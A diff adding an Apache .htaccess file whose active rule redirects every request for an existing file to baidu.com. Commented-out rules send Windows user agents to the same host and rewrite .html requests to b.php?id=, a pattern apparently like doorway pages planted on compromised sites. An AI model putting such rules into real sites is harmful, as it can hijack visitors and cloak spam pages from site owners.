@@ -1,0 +1,17 @@
+<IfModule mod_rewrite.c>
+	RewriteEngine on 
+	#RewriteCond %{HTTP_USER_AGENT} "^.*Windows.*"
+	#RewriteRule (.*) https://www.baidu.com
+
+	RewriteCond %{REQUEST_FILENAME} -f
+	RewriteRule (.*) Https://www.baidu.com
+
+	#RewriteCond %{REQUEST_URI} ^.*html [NC]
+	#RewriteRule (.*) b.php [L]
+
+	#RewriteCond %{REQUEST_URI} ^.*html [NC]
+	#RewriteRule ^(.*)\.html  b.php?id=$1 [L]
+
+	#RewriteCond %{REQUEST_FILENAME} !-f [NC]
+	#RewriteRule ^(.*)\.html  b.php?id=$1 [L]
+</IfModule>
